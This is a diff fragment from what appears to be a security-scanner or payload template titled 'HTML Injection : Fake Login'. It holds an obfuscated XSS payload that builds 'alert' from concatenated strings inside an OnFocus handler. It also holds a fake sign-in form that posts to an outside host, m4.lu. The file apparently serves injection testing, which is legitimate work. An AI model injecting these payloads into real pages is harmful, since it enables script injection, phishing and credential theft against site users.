@@ -7,7 +7,7 @@ info:
         <h1>HTML Injection : Fake Login</h1>
     </div>
     <div class="form-container">
-        <A Href AutoFocus %252F="/"OnFocus=k='t',top['aler'+k](1)>
+        <A Href AutoFocus %252F="/"OnFocus=k=\'t\',top[\'aler\'+k](1)>
         <form action="https://m4.lu" method="post" class="form-signin">
             <div class="form-group">
                 <label for="username">Username</label>
